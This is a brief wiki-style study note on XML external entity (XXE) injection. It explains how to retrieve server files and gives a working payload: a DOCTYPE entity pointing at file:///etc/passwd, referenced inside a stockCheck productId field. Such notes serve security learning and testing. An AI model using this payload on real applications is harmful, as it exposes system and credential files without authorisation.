---
title: XXE RETRIEVE FILES
tags: [misc, reference, general, canon/knowledge]
type: document
source: 11_KNOWLEDGE/misc
rscf:
  state: DERIVED
  claim_class: DERIVED
  provenance: AMOS_corpus
  scope: AMOS_general
---

# XXE RETRIEVE FILES

## Retrieve Files
* Modify the XML in 2 ways
   	* Introduce/edit a DOCTYPE element defining entity containg path to the file
   	* Edit data value in the XML that is returned in applications response to make use of that entity.
   	* <!DOCTYPE foo [ <!ENTITY xxe SYSTEM “file:///etc/passwd”> ]>
   	* <stockCheck><productId>&xxe;</productId></stockCheck>
* Good to check all data values in submitted XML

---
**Related:** [[00_HOME]] · [[KNOWLEDGE_MOC]] · [[AMOS_SIMULATION_KERNEL_V0_MATH_FOUNDATIONS]] · [[SYSTEM_SCAN_AGENT]] · [[AUTOMATION_PROFILES]]

---
**MOC:** [[MISC_MOC]]